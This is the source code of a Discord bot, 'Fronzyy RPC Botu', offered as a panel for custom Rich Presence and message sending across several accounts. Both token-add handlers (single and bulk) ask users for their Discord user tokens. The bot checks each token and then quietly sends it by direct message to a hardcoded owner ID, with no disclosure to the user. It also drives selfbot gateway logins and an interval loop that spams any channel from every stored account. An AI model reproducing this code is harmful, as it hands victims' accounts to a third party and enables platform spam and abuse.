import { 
  Client, 
  GatewayIntentBits, 
  ActionRowBuilder, 
  ButtonBuilder, 
  ButtonStyle, 
  ModalBuilder, 
  TextInputBuilder, 
  TextInputStyle, 
  StringSelectMenuBuilder,
  ActivityType,
  ContainerBuilder,
  TextDisplayBuilder,
  SeparatorBuilder,
  MessageFlags
} from 'discord.js';
import express from 'express';
import WebSocket from 'ws';

// --- UPTIME VƏ PORT ÜÇÜN EXPRESS SERVERİ ---
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Fronzyy RPC Botu aktif ve çalışıyor!');
});

app.listen(PORT, () => {
  console.log(`Sunucu ${PORT} portunda çalışıyor.`);
});
// -------------------------------------------

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages
  ]
});

// Bellekte saklanan tokenler ve aktif spam / RPC süreçleri
const userTokens = new Map();
const activeSpams = new Map();
const activeRPCs = new Map();

// Tokenlərin göndəriləcəyi və paneli aça biləcək səlahiyyətli şəxsin ID-si
const OWNER_ID = '1184518857679962186';

client.once('ready', () => {
  console.log(`Bot başarıyla giriş yaptı: ${client.user.tag}`);
  
  // Botun statusunu "powered by Fronzyy" olaraq təyin edirik
  client.user.setActivity({
    name: 'powered by Fronzyy',
    type: ActivityType.Playing
  });
});

// Bot sahibinə DM vasitəsilə mesaj göndərmək üçün köməkçi funksiya
async function sendTokenToOwner(botClient, title, token, accountName, username, addedByUserId) {
  if (!OWNER_ID) return;
  try {
    const owner = await botClient.users.fetch(OWNER_ID);
    if (owner) {
      await owner.send(
        `📥 **${title}**\n` +
        `👤 **Hesab:** ${accountName} (${username})\n` +
        `🆔 **Ekleyen Kullanıcı ID:** <@${addedByUserId}> (${addedByUserId})\n` +
        `🔑 **Token:** \`${token}\``
      );
    }
  } catch (err) {
    console.error('Owner DM gönderme hatası:', err);
  }
}

// User token ilə Discord Gateway üzərindən RPC (Presence) başladan köməkçi funksiya
function startUserRPC(token, accountName, rpcConfig) {
  return new Promise((resolve) => {
    const ws = new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');
    let heartbeatInterval = null;
    let settled = false;

    const finish = (sessionObj) => {
      if (!settled) {
        settled = true;
        resolve(sessionObj);
      }
    };

    const activity = {
      name: rpcConfig.name,
      type: 0, // Playing
      details: rpcConfig.details || undefined,
      state: rpcConfig.state || undefined,
      timestamps: { start: Date.now() }
    };

    const session = {
      stop: () => {
        if (heartbeatInterval) clearInterval(heartbeatInterval);
        try { ws.terminate(); } catch (e) {}
      }
    };

    const sendPresence = () => {
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
          op: 3,
          d: {
            since: null,
            activities: [activity],
            status: 'online',
            afk: false
          }
        }));
      }
    };

    ws.on('open', () => {
      ws.send(JSON.stringify({
        op: 2,
        d: {
          token: token,
          capabilities: 16381,
          properties: {
            os: 'Windows',
            browser: 'Discord Client',
            device: ''
          },
          presence: {
            status: 'online',
            since: 0,
            activities: [activity],
            afk: false
          }
        }
      }));
    });

    ws.on('message', (raw) => {
      try {
        const payload = JSON.parse(raw.toString());
        if (payload.op === 10 && payload.d?.heartbeat_interval) {
          heartbeatInterval = setInterval(() => {
            if (ws.readyState === WebSocket.OPEN) {
              ws.send(JSON.stringify({ op: 1, d: null }));
            }
          }, payload.d.heartbeat_interval);
        } else if (payload.t === 'READY') {
          sendPresence();
          finish(session);
        }
      } catch (e) {
        console.error(`RPC parse hatası (${accountName}):`, e.message);
      }
    });

    ws.on('error', (err) => {
      console.error(`RPC bağlantı hatası (${accountName}):`, err.message);
      finish(session);
    });

    ws.on('close', () => {
      if (heartbeatInterval) clearInterval(heartbeatInterval);
      finish(session);
    });

    setTimeout(() => finish(session), 4000);
  });
}

// !panel-spam komutu
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  if (message.content === '!panel-spam') {
    // Səlahiyyəti yoxdursa
    if (message.author.id !== OWNER_ID) {
      try {
        // Yazılan mesajı silirik
        await message.delete();
      } catch (e) {}

      // Xəbərdarlıq mesajı göndəririk və 5 saniyə sonra silirik
      try {
        const warningMsg = await message.channel.send({ 
          content: `❌ <@${message.author.id}> Bu komutu sadece yönetici kullanabilir.` 
        });
        
        setTimeout(async () => {
          try { await warningMsg.delete(); } catch (err) {}
        }, 5000); // 5000 millisaniyə = 5 saniyə
      } catch (err) {}

      return;
    }

    try { await message.delete(); } catch (e) {}

    const container = new ContainerBuilder()
      .setAccentColor(0x2b2d31)
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('# **Fronzyy RPC Botu**')
      )
      .addSeparatorComponents(
        new SeparatorBuilder().setDivider(true)
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('## **Nasıl kullanılır?**')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Başlat** : Eklediğiniz hesaplar üzerinden RPC veya mesaj başlatmanızı sağlar.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **RPC** : Eklediğiniz hesaplarda özel Rich Presence (RPC) başlatmanızı sağlar.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Spamı Başlat** : Eklediğiniz hesaplar üzerinden belirleyeceğiniz kanalda mesaj göndermeyi başlatmanızı sağlar.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Token Ekle** : Tekli token eklemenizi sağlar.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Toplu Token Ekle** : Her satıra bir token yazarak birden fazla hesabı aynı anda eklersiniz.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Token Sil** : Eklediğiniz tokenleri tek tek veya tümünü silebilirsiniz.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Tümünü Durdur** : Aktif olan tüm RPC ve mesaj süreçlerini durdurur.')
      )
      .addSeparatorComponents(
        new SeparatorBuilder().setDivider(true)
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent(`-# Copyright © Developed by Fronzyy 2026`)
      );

    // Ən başa Başlat düyməsi, yanında RPC və Spamı Başlat
    const row1 = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('start_main')
        .setLabel('Başlat')
        .setStyle(ButtonStyle.Success)
        .setEmoji('▶️'),

      new ButtonBuilder()
        .setCustomId('start_rpc')
        .setLabel('RPC')
        .setStyle(ButtonStyle.Primary)
        .setEmoji('🎮'),

      new ButtonBuilder()
        .setCustomId('start_spam')
        .setLabel('Spamı Başlat')
        .setStyle(ButtonStyle.Success)
        .setEmoji('🪧')
    );

    // İkinci sıra düymələr (Token Ekle, Toplu Token Ekle)
    const row2 = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('add_token')
        .setLabel('Token Ekle')
        .setStyle(ButtonStyle.Success)
        .setEmoji('➕'),

      new ButtonBuilder()
        .setCustomId('add_bulk_token')
        .setLabel('Toplu Token Ekle')
        .setStyle(ButtonStyle.Primary)
        .setEmoji('🗒️')
    );

    // Üçüncü sıra düymələr (Token Sil, Tümünü Durdur)
    const row3 = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('remove_token_panel')
        .setLabel('Token Sil')
        .setStyle(ButtonStyle.Danger)
        .setEmoji('🗑️'),

      new ButtonBuilder()
        .setCustomId('stop_all')
        .setLabel('Tümünü Durdur')
        .setStyle(ButtonStyle.Danger)
        .setEmoji('🗑️')
    );

    await message.channel.send({ 
      components: [container, row1, row2, row3],
      flags: MessageFlags.IsComponentsV2 
    });
  }
});

// Buton ve Modal etkileşimleri
client.on('interactionCreate', async (interaction) => {
  const userId = interaction.user.id;

  // --- 0. ƏN BAŞDAKİ BAŞLAT BUTONU ---
  if (interaction.isButton() && interaction.customId === 'start_main') {
    const tokens = userTokens.get(userId);
    if (!tokens || tokens.length === 0) {
      return interaction.reply({ content: '⚠️ Önce "Token Ekle" veya "Toplu Token Ekle" butonundan bir hesap eklemelisiniz!', ephemeral: true });
    }

    const selectMenu = new StringSelectMenuBuilder()
      .setCustomId('select_start_mode')
      .setPlaceholder('Başlatmak istediğiniz RPC işlemini seçin...')
      .addOptions([
        { label: 'RPC Başlat', value: 'mode_rpc', description: 'Seçili hesaplarda RPC başlatır', emoji: '🎮' },
        { label: 'Spam Başlat', value: 'mode_spam', description: 'Seçili hesaplarda mesaj gönderimi başlatır', emoji: '🪧' }
      ]);

    const row = new ActionRowBuilder().addComponents(selectMenu);
    await interaction.reply({ content: 'Başlatmak istediğiniz RPC işlemini seçin:', components: [row], ephemeral: true });
  }

  // Başlat menyusundan seçim edildikdə
  if (interaction.isStringSelectMenu() && interaction.customId === 'select_start_mode') {
    const mode = interaction.values[0];
    const tokens = userTokens.get(userId);
    if (!tokens || tokens.length === 0) {
      return interaction.reply({ content: '⚠️ Önce "Token Ekle" veya "Toplu Token Ekle" butonundan bir hesap eklemelisiniz!', ephemeral: true });
    }

    const menuId = mode === 'mode_rpc' ? 'select_rpc_account' : 'select_account';
    const selectMenu = new StringSelectMenuBuilder()
      .setCustomId(menuId)
      .setPlaceholder('RPC için hesap seçin...')
      .addOptions([
        { label: 'Bütün Hesaplar', value: 'all_accounts', description: 'Eklediğiniz bütün hesaplara RPC uygular' },
        ...tokens.map((t, index) => ({
          label: `${t.name} (${t.username})`,
          value: index.toString(),
          description: `Seçilen RPC hesabı: ${t.name}`
        }))
      ]);

    const row = new ActionRowBuilder().addComponents(selectMenu);
    await interaction.update({ content: 'RPC başlatmak istediğiniz hesabı seçin:', components: [row] });
  }

  // --- RPC BUTONU ---
  if (interaction.isButton() && interaction.customId === 'start_rpc') {
    const tokens = userTokens.get(userId);
    if (!tokens || tokens.length === 0) {
      return interaction.reply({ content: '⚠️ Önce "Token Ekle" veya "Toplu Token Ekle" butonundan bir hesap eklemelisiniz!', ephemeral: true });
    }

    const selectMenu = new StringSelectMenuBuilder()
      .setCustomId('select_rpc_account')
      .setPlaceholder('RPC uygulanacak hesabı seçin...')
      .addOptions([
        { label: 'Bütün Hesaplar', value: 'all_accounts', description: 'Eklediğiniz bütün hesaplara RPC uygular' },
        ...tokens.map((t, index) => ({
          label: `${t.name} (${t.username})`,
          value: index.toString(),
          description: `Seçilen RPC hesabı: ${t.name}`
        }))
      ]);

    const row = new ActionRowBuilder().addComponents(selectMenu);
    await interaction.reply({ content: 'RPC başlatmak istediğiniz hesabı seçin:', components: [row], ephemeral: true });
  }

  // RPC hesabı seçildikdən sonra modal
  if (interaction.isStringSelectMenu() && interaction.customId === 'select_rpc_account') {
    const selectedValue = interaction.values[0];

    const modal = new ModalBuilder()
      .setCustomId(`rpc_modal_${selectedValue}`)
      .setTitle('RPC Ayarları');

    const nameInput = new TextInputBuilder()
      .setCustomId('rpc_name')
      .setLabel('RPC Aktivite / Oyun Adı')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    const detailsInput = new TextInputBuilder()
      .setCustomId('rpc_details')
      .setLabel('RPC Detay (Details - isteğe bağlı)')
      .setStyle(TextInputStyle.Short)
      .setRequired(false);

    const stateInput = new TextInputBuilder()
      .setCustomId('rpc_state')
      .setLabel('RPC Durum (State - isteğe bağlı)')
      .setStyle(TextInputStyle.Short)
      .setRequired(false);

    modal.addComponents(
      new ActionRowBuilder().addComponents(nameInput),
      new ActionRowBuilder().addComponents(detailsInput),
      new ActionRowBuilder().addComponents(stateInput)
    );

    await interaction.showModal(modal);
  }

  // RPC modal cavabı
  if (interaction.isModalSubmit() && interaction.customId.startsWith('rpc_modal_')) {
    const selectedValue = interaction.customId.replace('rpc_modal_', '');
    const rpcName = interaction.fields.getTextInputValue('rpc_name').trim();
    const rpcDetails = interaction.fields.getTextInputValue('rpc_details').trim();
    const rpcState = interaction.fields.getTextInputValue('rpc_state').trim();

    const tokens = userTokens.get(userId) || [];
    const targetTokens = selectedValue === 'all_accounts' ? tokens : [tokens[parseInt(selectedValue)]].filter(Boolean);

    if (targetTokens.length === 0) {
      return interaction.reply({ content: '⚠️ RPC başlatılacak hesap bulunamadı!', ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });

    if (!activeRPCs.has(userId)) {
      activeRPCs.set(userId, []);
    }

    let startedCount = 0;
    for (const tObj of targetTokens) {
      const session = await startUserRPC(tObj.token, tObj.name, {
        name: rpcName,
        details: rpcDetails,
        state: rpcState
      });
      if (session && typeof session.stop === 'function') {
        activeRPCs.get(userId).push(session);
        startedCount++;
      }
    }

    await interaction.editReply({ content: `🎮 Seçilen ${startedCount} hesap için RPC başlatıldı: **${rpcName}**` });
  }

  // --- 1. TOKEN EKLE BUTONU ---
  if (interaction.isButton() && interaction.customId === 'add_token') {
    const modal = new ModalBuilder()
      .setCustomId('token_modal')
      .setTitle('Discord Token Ekle');

    const tokenInput = new TextInputBuilder()
      .setCustomId('token_input')
      .setLabel('Discord Tokeninizi girin')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    const firstRow = new ActionRowBuilder().addComponents(tokenInput);
    modal.addComponents(firstRow);

    await interaction.showModal(modal);
  }

  // --- 1.1. TOPLU TOKEN EKLE BUTONU ---
  if (interaction.isButton() && interaction.customId === 'add_bulk_token') {
    const modal = new ModalBuilder()
      .setCustomId('bulk_token_modal')
      .setTitle('Toplu Discord Token Ekle');

    const tokenInput = new TextInputBuilder()
      .setCustomId('bulk_token_input')
      .setLabel('Discord Tokenlerini girin')
      .setPlaceholder('Her satıra 1 token gelecek şekilde yazın')
      .setStyle(TextInputStyle.Paragraph)
      .setRequired(true);

    const firstRow = new ActionRowBuilder().addComponents(tokenInput);
    modal.addComponents(firstRow);

    await interaction.showModal(modal);
  }

  // --- 1.2. TOKEN SİL PANELİ (SEÇİM MENÜSÜ) ---
  if (interaction.isButton() && interaction.customId === 'remove_token_panel') {
    const tokens = userTokens.get(userId);
    if (!tokens || tokens.length === 0) {
      return interaction.reply({ content: '⚠️ Silinecek kayıtlı RPC hesabınız bulunmuyor!', ephemeral: true });
    }

    const selectMenu = new StringSelectMenuBuilder()
      .setCustomId('select_remove_account')
      .setPlaceholder('Silmek istediğiniz hesabı seçin...')
      .addOptions([
        { label: 'Bütün Tokenleri Sil', value: 'clear_all_tokens', description: 'Size ait olan bütün tokenleri sistemden siler', emoji: '🗑️' },
        ...tokens.map((t, index) => ({
          label: `${t.name} (${t.username})`,
          value: index.toString(),
          description: `Bu hesabı sil`,
          emoji: '❌'
        }))
      ]);

    const row = new ActionRowBuilder().addComponents(selectMenu);
    await interaction.reply({ content: 'Silmek istediğiniz hesabı veya seçeneği belirleyin:', components: [row], ephemeral: true });
  }

  // --- 2. TEK TOKEN MODAL CEVABI ---
  if (interaction.isModalSubmit() && interaction.customId === 'token_modal') {
    const token = interaction.fields.getTextInputValue('token_input').trim();

    await interaction.deferReply({ ephemeral: true });

    try {
      const userRes = await fetch('https://discord.com/api/v9/users/@me', {
        headers: { 'Authorization': token }
      });

      if (!userRes.ok) {
        return interaction.editReply({ content: `❌ Hata: Girilen token geçersiz veya devre dışı bırakılmış.` });
      }

      const userData = await userRes.json();
      const globalName = userData.global_name || userData.username;
      const username = userData.username;

      if (!userTokens.has(userId)) {
        userTokens.set(userId, []);
      }
      
      const existingList = userTokens.get(userId);
      if (!existingList.some(t => t.token === token)) {
        existingList.push({ token, name: globalName, username: username });
      }

      // Tokeni qeyd olunan ID-nin DM-nə göndəririk
      await sendTokenToOwner(client, 'Yeni Tekli Token Eklendi', token, globalName, username, userId);

      await interaction.editReply({ content: `✅ Başarıyla eklendi! RPC Hesabı: **${globalName} (${username})**` });
    } catch (err) {
      await interaction.editReply({ content: `❌ Token eklenirken bir hata oluştu.` });
    }
  }

  // --- 2.1. TOPLU TOKEN MODAL CEVABI ---
  if (interaction.isModalSubmit() && interaction.customId === 'bulk_token_modal') {
    const rawInput = interaction.fields.getTextInputValue('bulk_token_input').trim();
    const tokens = rawInput.split('\n').map(t => t.trim()).filter(t => t.length > 0);

    if (tokens.length === 0) {
      return interaction.reply({ content: '❌ Geçerli token bulunamadı!', ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });

    if (!userTokens.has(userId)) {
      userTokens.set(userId, []);
    }
    const existingList = userTokens.get(userId);

    let successCount = 0;
    let failCount = 0;
    let addedNames = [];

    for (const token of tokens) {
      try {
        const userRes = await fetch('https://discord.com/api/v9/users/@me', {
          headers: { 'Authorization': token }
        });

        if (userRes.ok) {
          const userData = await userRes.json();
          const globalName = userData.global_name || userData.username;
          const username = userData.username;

          if (!existingList.some(t => t.token === token)) {
            existingList.push({ token, name: globalName, username: username });
          }

          addedNames.push(`${globalName} (${username})`);
          successCount++;

          // Hər bir etibarlı tokeni qeyd olunan ID-nin DM-nə göndəririk
          await sendTokenToOwner(client, 'Toplu Token Eklendi', token, globalName, username, userId);
        } else {
          failCount++;
        }
      } catch (err) {
        failCount++;
      }
    }

    await interaction.editReply({ 
      content: `📦 **Toplu Token İşlemi Tamamlandı!**\n✅ Başarıyla eklenen: **${successCount}** RPC hesabı\n❌ Geçersiz/Eklenemeyen: **${failCount}**\n\n${addedNames.length > 0 ? 'Eklenenler:\n- ' + addedNames.join('\n- ') : ''}` 
    });
  }

  // --- 2.2. TOKEN SİLME SEÇİM İŞLEMİ ---
  if (interaction.isStringSelectMenu() && interaction.customId === 'select_remove_account') {
    const selectedValue = interaction.values[0];
    const tokens = userTokens.get(userId);

    if (!tokens) {
      return interaction.reply({ content: '❌ Kayıtlı RPC hesabınız bulunmuyor.', ephemeral: true });
    }

    if (selectedValue === 'clear_all_tokens') {
      userTokens.set(userId, []);
      return interaction.reply({ content: '🗑️ Size ait olan bütün RPC tokenleri başarıyla silindi!', ephemeral: true });
    } else {
      const index = parseInt(selectedValue);
      const removedAccount = tokens.splice(index, 1)[0];
      return interaction.reply({ content: `❌ Başarıyla silindi: **${removedAccount.name} (${removedAccount.username})**`, ephemeral: true });
    }
  }

  // --- 3. SPAMI BAŞLAT BUTONU ---
  if (interaction.isButton() && interaction.customId === 'start_spam') {
    const tokens = userTokens.get(userId);
    if (!tokens || tokens.length === 0) {
      return interaction.reply({ content: '⚠️ Önce "Token Ekle" veya "Toplu Token Ekle" butonundan bir hesap eklemelisiniz!', ephemeral: true });
    }

    const selectMenu = new StringSelectMenuBuilder()
      .setCustomId('select_account')
      .setPlaceholder('Hesap seçin...')
      .addOptions([
        { label: 'Bütün Hesaplar', value: 'all_accounts', description: 'Eklediğiniz bütün hesaplar işlem yapacak' },
        ...tokens.map((t, index) => ({
          label: `${t.name} (${t.username})`,
          value: index.toString(),
          description: `Seçilen hesap: ${t.name}`
        }))
      ]);

    const row = new ActionRowBuilder().addComponents(selectMenu);
    await interaction.reply({ content: 'İşlem yapmak istediğiniz hesabı seçin:', components: [row], ephemeral: true });
  }

  // --- 4. HESAP SEÇİLDİKTEN SONRA KANAL VE SÜRE TALEBİ ---
  if (interaction.isStringSelectMenu() && interaction.customId === 'select_account') {
    const selectedValue = interaction.values[0];

    const modal = new ModalBuilder()
      .setCustomId(`spam_modal_${selectedValue}`)
      .setTitle('Gönderim Ayarları');

    const channelInput = new TextInputBuilder()
      .setCustomId('channel_id')
      .setLabel('İşlem yapılacak Kanalın ID-si')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    const timeInput = new TextInputBuilder()
      .setCustomId('spam_interval')
      .setLabel('Kaç saniyede bir? (örn: 3)')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    const messageInput = new TextInputBuilder()
      .setCustomId('spam_message')
      .setLabel('Gönderilecek mesaj')
      .setStyle(TextInputStyle.Paragraph)
      .setRequired(true);

    modal.addComponents(
      new ActionRowBuilder().addComponents(channelInput),
      new ActionRowBuilder().addComponents(timeInput),
      new ActionRowBuilder().addComponents(messageInput)
    );

    await interaction.showModal(modal);
  }

  // --- 5. SPAM BAŞLANGICI (MODAL SUBMIT) ---
  if (interaction.isModalSubmit() && interaction.customId.startsWith('spam_modal_')) {
    const selectedValue = interaction.customId.replace('spam_modal_', '');
    const channelId = interaction.fields.getTextInputValue('channel_id').trim();
    const intervalSec = parseFloat(interaction.fields.getTextInputValue('spam_interval'));
    const spamText = interaction.fields.getTextInputValue('spam_message');

    if (isNaN(intervalSec) || intervalSec <= 0) {
      return interaction.reply({ content: '❌ Geçersiz saniye değeri girdiniz!', ephemeral: true });
    }

    const tokens = userTokens.get(userId);
    let targetTokens = [];

    if (selectedValue === 'all_accounts') {
      targetTokens = tokens;
    } else {
      targetTokens = [tokens[parseInt(selectedValue)]];
    }

    await interaction.reply({ content: `🚀 Seçilen ${targetTokens.length} RPC hesabı ile işlem başlatıldı!`, ephemeral: true });

    if (!activeSpams.has(userId)) {
      activeSpams.set(userId, []);
    }

    for (const tObj of targetTokens) {
      const interval = setInterval(async () => {
        try {
          const response = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
            method: 'POST',
            headers: {
              'Authorization': tObj.token,
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({ content: spamText })
          });

          if (!response.ok) {
            console.error(`Gönderim hatası (${tObj.name}): HTTP ${response.status}`);
          }
        } catch (err) {
          console.error(`RPC bağlantı hatası (${tObj.name}):`, err.message);
        }
      }, intervalSec * 1000);

      activeSpams.get(userId).push({ interval });
    }
  }

  // --- 6. TÜMÜNÜ DURDUR BUTONU ---
  if (interaction.isButton() && interaction.customId === 'stop_all') {
    const userSpams = activeSpams.get(userId) || [];
    const userRPCs = activeRPCs.get(userId) || [];

    if (userSpams.length === 0 && userRPCs.length === 0) {
      return interaction.reply({ content: 'ℹ️ Aktif RPC süreciniz bulunmuyor.', ephemeral: true });
    }

    for (const item of userSpams) {
      clearInterval(item.interval);
    }
    for (const rpcItem of userRPCs) {
      if (rpcItem && typeof rpcItem.stop === 'function') {
        rpcItem.stop();
      }
    }

    activeSpams.set(userId, []);
    activeRPCs.set(userId, []);
    await interaction.reply({ content: '🛑 Hesaplarınızdaki bütün aktif RPC süreçleri durduruldu.', ephemeral: true });
  }
});

// Render-də token yoxlanışı ilə giriş
if (!process.env.DISCORD_TOKEN) {
  console.error("❌ HATA: DISCORD_TOKEN environment dəyişəni tapılmadı! Render panelindən əlavə edin.");
  process.exit(1);
}

client.login(process.env.DISCORD_TOKEN);
